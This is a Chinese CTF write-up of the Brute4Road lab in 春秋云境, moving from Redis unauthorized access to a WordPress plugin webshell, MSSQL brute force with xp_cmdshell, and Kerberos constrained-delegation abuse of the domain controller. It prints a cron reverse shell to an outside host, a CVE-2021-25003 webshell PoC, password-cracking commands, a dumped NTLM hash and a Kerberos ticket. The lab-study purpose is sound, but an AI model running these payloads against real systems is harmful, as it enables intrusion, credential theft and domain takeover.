+++
date = '2026-03-06T09:00:00+08:00'
lastmod = '2026-03-06T09:00:00+08:00'
draft = false
title = '春秋云境 - Brute4Road WriteUP'
categories = ['WriteUP', '春秋云境']
tags = ['WriteUP', '春秋云境']

+++

## flag 1

拿到题目网址，上 fscan 进行扫描，发现存在 Redis 无密码连接，下面考虑从 Redis 入手。  

```plaintext
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-13 20:32:35] [INFO] 暴力破解线程数: 1
[2025-03-13 20:32:35] [INFO] 开始信息扫描
[2025-03-13 20:32:35] [INFO] 最终有效主机数量: 1
[2025-03-13 20:32:35] [INFO] 开始主机扫描
[2025-03-13 20:32:35] [INFO] 有效端口数量: 233
[2025-03-13 20:32:35] [SUCCESS] 端口开放 39.98.116.168:110
[2025-03-13 20:32:35] [SUCCESS] 端口开放 39.98.116.168:6379
[2025-03-13 20:32:36] [SUCCESS] 端口开放 39.98.116.168:21
[2025-03-13 20:32:36] [SUCCESS] 端口开放 39.98.116.168:22
[2025-03-13 20:32:36] [SUCCESS] 端口开放 39.98.116.168:80
[2025-03-13 20:32:36] [SUCCESS] 服务识别 39.98.116.168:21 => [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
[2025-03-13 20:32:36] [SUCCESS] 服务识别 39.98.116.168:22 => [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
[2025-03-13 20:32:39] [SUCCESS] 服务识别 39.98.116.168:110 =>
[2025-03-13 20:32:40] [SUCCESS] 服务识别 39.98.116.168:6379 => [redis] 版本:5.0.12 产品:Redis key-value store
[2025-03-13 20:32:42] [SUCCESS] 服务识别 39.98.116.168:80 => [http] 版本:1.20.1 产品:nginx
[2025-03-13 20:32:45] [INFO] 存活端口数量: 5
[2025-03-13 20:32:45] [INFO] 开始漏洞扫描
[2025-03-13 20:32:45] [INFO] 加载的插件: ftp, pop3, redis, ssh, webpoc, webtitle
[2025-03-13 20:32:45] [SUCCESS] 网站标题 http://39.98.116.168      状态码:200 长度:4833   标题:Welcome to CentOS
[2025-03-13 20:32:46] [SUCCESS] 匿名登录成功!
[2025-03-13 20:32:48] [SUCCESS] Redis 39.98.116.168:6379 发现未授权访问文件位置:/usr/local/redis/db/dump.rdb
[2025-03-13 20:32:52] [SUCCESS] Redis无密码连接成功: 39.98.116.168:6379
```

通过 Redis 自身提供的 config 命令，可以进行写文件的操作，然后我们可以生成公钥写入到服务器的 `/root/.ssh` 文件夹中的 `authotrized_keys` 文件中，从而使用对应的私钥进行 ssh 连接，尝试过后发现权限不够，我们换一种方式。  

```bash
# 在攻击机上操作
ssh-keygen -t rsa
cd /root/.ssh
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt |redis-cli -h 39.98.116.168 -x set ssh_key

redis-cli -h 39.98.116.168
// 使用 CONFIG GET dir 命令得到 Redis 备份的路径
39.98.116.168:6379> config get dir
39.98.116.168:6379> config set dir /root/.ssh
39.98.116.168:6379> config set dbfilename "authorized_keys"
39.98.116.168:6379> save
```

下面去尝试写入计划任务进行 RCE，发现还是权限不够，那只能再尝试一下打主从复制了。  

```bash
39.98.116.168:6379> set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/47.115.148.66/1234 0>&1\n\n"
39.98.116.168:6379> config set dir /var/spool/cron
39.98.116.168:6379> config set dbfilename root 
39.98.116.168:6379> save
```

 我们使用大佬的 [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server) 项目是实现这个攻击，记得要在攻击机上开放 21000 这个端口，否则会攻击失败。  

```bash
python3 redis-rogue-server.py --rhost 39.98.116.168 --lhost 47.115.148.66
```

![](../assets/屏幕截图%202025-03-26%20093805.png)

我们去寻找 flag，在 `/home/redis/flag` 可以找到 `flag01`，但是之后发现我们权限不够，看不了 flag，那么我们要想办法提权，下面尝试 find 提权。  

```bash
find / -perm -u=s -type f 2>/dev/null
```

输出结果如下，我们尝试用 base64 来读 flag01。  

```plaintext
[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

获得 flag01。  

```plaintext
[redis@centos-web01 flag]$ base64 flag01
IOKWiOKWiOKWiOKWiOKWiOKWiCAgICAgICAgICAgICAgICAgICAg4paI4paIICAgICAgICAgICAg
ICDilojiloggIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICAgICAgICAgICAgICAgICAgICAgICAg
IOKWiOKWiArilpHilojilpHilpHilpHilpHilojiloggICAgICAgICAgICAgICAgICDilpHiloji
loggICAgICAgICAgICAg4paI4paR4paIIOKWkeKWiOKWiOKWkeKWkeKWkeKWkeKWiOKWiCAgICAg
ICAgICAgICAgICAgICAgICAgICDilpHilojilogK4paR4paIICAg4paR4paI4paIICDilojiloji
lojilojilojilogg4paI4paIICAg4paI4paIIOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI4paI4paI
4paI4paIICAg4paIIOKWkeKWiCDilpHilojiloggICDilpHilojiloggICDilojilojilojiloji
lojiloggICDilojilojilojilojilojiloggICAgICAg4paR4paI4paICuKWkeKWiOKWiOKWiOKW
iOKWiOKWiCAg4paR4paR4paI4paI4paR4paR4paI4paR4paI4paIICDilpHilojilojilpHilpHi
lpHilojilojilpEgIOKWiOKWiOKWkeKWkeKWkeKWiOKWiCDilojilojilojilojilojilojilpHi
lojilojilojilojilojilojiloggICDilojilojilpHilpHilpHilpHilojilogg4paR4paR4paR
4paR4paR4paR4paI4paIICAg4paI4paI4paI4paI4paI4paICuKWkeKWiOKWkeKWkeKWkeKWkSDi
lojilogg4paR4paI4paIIOKWkSDilpHilojiloggIOKWkeKWiOKWiCAg4paR4paI4paIICDilpHi
lojilojilojilojilojilojilojilpHilpHilpHilpHilpHilogg4paR4paI4paI4paR4paR4paR
4paI4paIICDilpHilojiloggICDilpHilojiloggIOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAg4paI
4paI4paR4paR4paR4paI4paICuKWkeKWiCAgICDilpHilojilogg4paR4paI4paIICAg4paR4paI
4paIICDilpHilojiloggIOKWkeKWiOKWiCAg4paR4paI4paI4paR4paR4paR4paRICAgICDilpHi
logg4paR4paI4paIICDilpHilpHilojilogg4paR4paI4paIICAg4paR4paI4paIIOKWiOKWiOKW
keKWkeKWkeKWkeKWiOKWiCDilpHilojiloggIOKWkeKWiOKWiArilpHilojilojilojilojiloji
lojilogg4paR4paI4paI4paIICAg4paR4paR4paI4paI4paI4paI4paI4paIICDilpHilpHiloji
logg4paR4paR4paI4paI4paI4paI4paI4paIICAgIOKWkeKWiCDilpHilojiloggICDilpHilpHi
lojilojilpHilpHilojilojilojilojilojilogg4paR4paR4paI4paI4paI4paI4paI4paI4paI
4paI4paR4paR4paI4paI4paI4paI4paI4paICuKWkeKWkeKWkeKWkeKWkeKWkeKWkSAg4paR4paR
4paRICAgICDilpHilpHilpHilpHilpHilpEgICAg4paR4paRICAg4paR4paR4paR4paR4paR4paR
ICAgICDilpEgIOKWkeKWkSAgICAg4paR4paRICDilpHilpHilpHilpHilpHilpEgICDilpHilpHi
lpHilpHilpHilpHilpHilpEgIOKWkeKWkeKWkeKWkeKWkeKWkSAKCgpmbGFnMDE6IGZsYWd7OTRk
ZjI5NzQtYzI5OS00YzhiLTk2MWQtOTJlYmI1YThlM2M3fQoKQ29uZ3JhdHVsYXRpb25zISAhICEK
R3Vlc3Mgd2hlcmUgaXMgdGhlIHNlY29uZCBmbGFnPwo=


解码后如下：
 ██████                    ██              ██  ███████                           ██
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░ 


flag01: flag{94df2974-c299-4c8b-961d-92ebb5a8e3c7}

Congratulations! ! !
Guess where is the second flag?
```

## flag 2

下面我们要先进行信息收集，再上传 fscan 进行内网的扫描。  

```plaintext
[redis@centos-web01 flag]$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.2.7  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe34:ac7  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:34:0a:c7  txqueuelen 1000  (Ethernet)
        RX packets 80181  bytes 109780054 (104.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16151  bytes 9598825 (9.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

以下是扫描记录。  

```plaintext
[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -o res_2_0.txt

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
(icmp) Target 172.22.2.34     is alive
(icmp) Target 172.22.2.18     is alive
[*] Icmp alive hosts len is: 5
172.22.2.16:1433 open
172.22.2.18:22 open
172.22.2.34:445 open
172.22.2.18:445 open
172.22.2.16:445 open
172.22.2.3:445 open
172.22.2.18:139 open
172.22.2.34:139 open
172.22.2.16:139 open
172.22.2.3:139 open
172.22.2.34:135 open
172.22.2.16:135 open
172.22.2.3:135 open
172.22.2.18:80 open
172.22.2.7:6379 open
172.22.2.3:88 open
172.22.2.16:80 open
172.22.2.7:22 open
172.22.2.7:21 open
172.22.2.7:80 open
[*] alive ports len is: 20
start vulscan
[*] NetInfo 
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] WebTitle http://172.22.2.16        code:404 len:315    title:Not Found
[*] WebTitle http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] NetInfo 
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] NetInfo 
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] NetBios 172.22.2.34     XIAORANG\CLIENT01             
[*] OsInfo 172.22.2.3   (Windows Server 2016 Datacenter 14393)
[*] OsInfo 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
[*] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[*] NetBios 172.22.2.3      [+] DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[+] ftp 172.22.2.7:21:anonymous 
   [->]pub
[*] WebTitle http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
已完成 20/20
[*] 扫描结束,耗时: 12.607943711s
```

我们看到有个 wordpress，先尝试把 wordpress 打下来，先用 wpscan 进行扫描。  

```plaintext
┌──(lucifer㉿LAPTOP-JimmyL)-[~]
└─$ proxychains4 wpscan --url http://172.22.2.18/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
[+] URL: http://172.22.2.18/ [172.22.2.18]
[+] Started: Wed Mar 26 21:46:17 2025

[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.22.2.18/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.22.2.18/index.php/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://172.22.2.18/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 1.9
 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2024-08-08T17:00:00.000Z
 | [!] The version is out of date, the latest version is 7.0.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK      > (0 / 137)  0.00%  ETA: ??:??:??
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK     > (19 / 137) 13.86%  ETA: 00:00:04
[proxychains] Strict chain  ...  47.115.148.66:1236  ...  172.22.2.18:80  ...  OK     > (38 / 137) 27.73%  ETA: 00:00:02
 Checking Config Backups - Time: 00:00:02 <=========================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Mar 26 21:46:29 2025
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 42.801 KB
[+] Data Received: 250.835 KB
[+] Memory used: 250.129 MB
[+] Elapsed time: 00:00:12
```

我们发现这个 wordpress 有个叫 `wpcargo` 的插件，搜索一下发现这个插件存在 `CVE-2021-25003` 漏洞，可以通过 Bypass 去上传木马，我们使用网上的 PoC 去尝试攻击。  

```python
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://172.22.2.18/'
cmd = 'whoami'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

结果成功收到回显，那么我们去 RCE 、上马即可。  

![](../assets/屏幕截图%202025-03-26%20220415.png)

测试了一下，发现不出网，那么只能直接命令执行找 flag 了，尝试提权发现不太行。  

```bash
find / -perm -u=s -type f 2>/dev/null
```

我们去重新写个马，方便用蚁剑去连接。  

```bash
echo "<?=eval(\$_POST[1]);?>" > shell.php
```

用蚁剑连接，然后我们去看 `wp-config.php` 配置文件，获取数据库的账号密码 `wpuser/WpuserEha8Fgj9`。  

![](../assets/屏幕截图%202025-03-26%20221607.png)

我们使用蚁剑的数据库连接功能，去查看数据库的内容，从而找到 flag02。  

![](../assets/屏幕截图%202025-03-26%20221743.png)

然而，我们还在 `S0meth1ng_y0u_m1ght_1ntereSted` 找到了一部分信息，是一些密码，估计是可能在之后的渗透中有用。  

![](../assets/屏幕截图%202025-03-26%20222122.png)

## flag 3

下面我们再去看看 `172.22.2.16` ，这个机子有 MSSQL 服务，根据我们之前拿到的密码，整理出一个字典，然后用这些密码去进行爆破这个数据库。  

```python
import csv


def extract_csv(csv_file_path, txt_file_path):
    try:
        with open(csv_file_path, 'r', newline='', encoding='utf-8') as csvfile:
            reader = csv.DictReader(csvfile)

            with open(txt_file_path, 'w', encoding='utf-8') as txtfile:
                for row in reader:
                    txtfile.write(row['pAssw0rd'] + '\n')

        print("数据已成功保存到", txt_file_path)
    except FileNotFoundError:
        print("错误：未找到指定的 CSV 文件。")
    except IndexError:
        print("错误：指定的行号超出了 CSV 文件的范围。")
    except Exception as e:
        print(f"发生未知错误：{e}")


if __name__ == "__main__":
    csv_file = '172.22.2.18_20250326222041.csv'
    txt_file = 'dict.txt'
    extract_csv(csv_file, txt_file)
```

然后我们去用 hydra 去进行爆破密码。  

```bash
proxychains4 -q hydra -l sa -P ./dict.txt 172.22.2.16 mssql -f
```

爆破结果如下。  

```plaintext
┌──(lucifer㉿LAPTOP-JimmyL)-[~/shenTmp]
└─$ proxychains4 -q hydra -l sa -P ./dict.txt 172.22.2.16 mssql -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-26 22:51:06
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
[DATA] attacking mssql://172.22.2.16:1433/
[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC
[STATUS] attack finished for 172.22.2.16 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-26 22:51:21
```

还可以用 msf 进行爆破。  

```plaintext
msf6 > use auxiliary/scanner/mssql/mssql_login
msf6 auxiliary(scanner/mssql/mssql_login) > set rhosts 172.22.2.16
rhosts => 172.22.2.16
msf6 auxiliary(scanner/mssql/mssql_login) > set username sa
username => sa
msf6 auxiliary(scanner/mssql/mssql_login) > set pass_file /pass.txt
pass_file => /pass.txt
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 172.22.2.16:1433      - 172.22.2.16:1433 - MSSQL - Starting authentication scanner.
[!] 172.22.2.16:1433      - No active DB -- Credential data will not be saved!
[+] 172.22.2.16:1433      - 172.22.2.16:1433 - Login Successful: WORKSTATION\sa:ElGNkOiC
[*] 172.22.2.16:1433      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

下面我们去连接 MSSQL，尝试去执行系统命令，用回我们之前在 `Tsclient` 打过的 payload 即可。  

```SQL
select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'

EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;

exec master..xp_cmdshell 'whoami'
```

我们尝试上马，发现这台机器好像不出网，那么我们配合 MDUT 工具去上传文件，上传文件之前要先激活 `Ole Automation Procedures` 组件。  

![](../assets/屏幕截图%202025-03-26%20231818.png)

上传提权工具 Ladon。  

![](../assets/屏幕截图%202025-03-26%20231802.png)

然后用它来提权，那么我们还是用 BadPotato 去进行提权。  

```cmd
C:/迅雷下载/Ladon.exe BadPotato whoami
```

发现它开启了 3389 端口，那么我们新建一个用户，然后去 rdp 连接它使得我们进一步的操作更加简便。  

![](../assets/屏幕截图%202025-03-26%20232326.png)

```cmd
C:/迅雷下载/Ladon.exe BadPotato "net user lucifer qwer1234! /add"
C:/迅雷下载/Ladon.exe BadPotato "net localgroup administrators lucifer /add"
```

成功连上 rdp，可以爽打了，我们在管理员的目录下找到 flag03。  

![](../assets/屏幕截图%202025-03-26%20232937.png)

```plaintext
8""""8                           88     8"""8                    
8    8   eeeee  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee 
8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8 
88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8 
88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8 
88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8 


flag03: flag{5382b814-a652-4f4b-a1ae-6fe942c34029}
```

## flag 4

可以上 BloodBound 做一下信息收集。  

![](../assets/chu0pic2.png)

计算机 `MSSQLSERVER.XIAORANG.LAB` 具有对计算机 `DC.XIAORANG.LAB` 的约束委派权限，所以可以通过 MSSQL 直接打 DC，我们先抓取一下用户的哈希。  

```plaintext
* Username : MSSQLSERVER$
* Domain   : XIAORANG
* NTLM     : cb4152cfb532c6ca211cb0f202c8bc7d
* SHA1     : 42fefab7f63f6b0b787fd985ffe2ab70c9b23aa4
```

1. 使用 Rubeus 以拥有约束性委派权限的 MSSQLSERVER$ 账户凭据向 KDC 请求一个可转发的 TGT；  
2. 再使用 S4U2self 协议以域管理员身份去请求 MSSQLSERVER$ 自身可转发的服务票据 ST1；  
3. 最后使用 ST1 通过 S4U2proxy 协议去冒充域管理员身份请求到 `ldap/DC.xiaorang.lab` 的服务票据。  

```cmd
# 申请 TGT
Rubeus4.0.exe asktgt /user:MSSQLSERVER$ /rc4:cb4152cfb532c6ca211cb0f202c8bc7d /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > 1.txt

# 利用 Rubeus 导入票据
Rubeus4.0.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE1fZSzFGECOkrzkD2k96UTUOEMxmJz7eeEO+avd/fgGPbfQl9qApFNjTiz739TgEQ65qzjXmK87j/Qp7xq1R67cxxCIVJ871F2cDuSLcRSCqhQW5bXWr23YIBum53EXwrWeCqktyy+2BJ4iFal63LhOTcFSX7TMzKjv5ly2CozZ5jYe1R/Ltgv/zEJYNAmvVdwotPI2EeztNuwVGCIBXs5uO4RQgDUrU+d1zxc5rWkg6hK59kfphY+Zu3l38srwnZHHbpQfPlibiLneAZTzA12I5ePNImo0FOZlFJmHoA4ONrek5Yn9TQkdPjD0U32ITjuhZUWPKwI4F4lSttVOpoDzgMbeI+PwKVbHGG+kKkpuzwlwLD0TP7ZnUuxO1GVK0zxKzlq4fSzv+bJDDa2H/dKFw++pnMBs//ygEfARfBnVkr5r0nmuH2I4/1kvSD0QaOx4T0SzHV7JQF3B37QPRXZtrrS/PVqmnW/VRwrbGyRSaQDhN1VEKziCVHr1tfCingLu9GojXnfjqO74Fv4UHtsM2UrJdkT4abdyLAfwtvXzsXiipQgHkZXin3jjnHCaO0dKHdIKB7OfPqYFF8YnudRleqkREgBICfM4W6Q73cnrN+Akv7DH/r7OzPCREiLkDh+7EGre5nNatJRfCQbiUNFaAzUOlkhWYVMHWvXyGfZ2UKC+WhjeYH0HVXuYtvRtbziam504XJfQCTOrcN923VU0Jtc5OYcfA4jqgaCppJfOJQKJqfLC7o7lgVz/XUyyiJZr9jCohLePZu08BsEdLFr28DNiEpP+lZsMPCKusoSpWzqA8OoIcm9F4ofnvN80gMaDByK7mSBq6fMmLGrMTCl6Vz30MnlpXpRDTCEOT4qtOpBRhQ4vs94gn/1Yeu+TogJBacnRhCnXLx3S2AlhE1Yo1fNoKa9gP7JY74vNfX7NobPLYfHIh11PGUzrvcg/atw3aEVq0ryo5So49J3r/vlNH5VyfJ958JRhs3lt7xt6xEEO189ECrCYxNXM+9/di+rscSNg9nPxZUKKzxOwcpVUSE+TURtj/PkI6n8Kb5GmY1ESODAgI9BxWC9D7mYKiiJ/3YHqMAGVUJc08mDHuZP4d5+oMIeY+XDx4gRidh1Tif5dXjwrYYVzRalNTVysy4Yx0Q6o5zME7/jtQsvyGZvlTb2A1AJ2iGPUtzTf06KWgQ2r5drr25aquv0FuF3W6cff5edTsvQ2q2oyJRmTcH826RECg6KPl+gaqbp64k8pnmLA9ZJj0W7hGttMNZboXyBF4QoSHMAt+ONUnOdIipka025EFALozd0Gqnmv1LMj6R+rveq63VxdQKiDaupU6P80tMBqm8oaV9tsid0slhazTw+4XENl8wSPZC+dVW8AIggxwLGAno0qmtO9K1qVvBkziN75pGGm8feKGHhzvJRDY9tjmKnilHFk2YkRrcpLLahWjsfWgqqO2ET2ddajgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDdnHrk+4NVp4KXDIew7vEUoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDUxMTExMTMzNFqmERgPMjAyNTA1MTEyMTEzMzRapxEYDzIwMjUwNTE4MTExMzM0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
```

导入后即可和 DC 通讯。  

```cmd
type \\DC.xiaorang.lab\c$\users\administrator\flag\flag04.txt
```
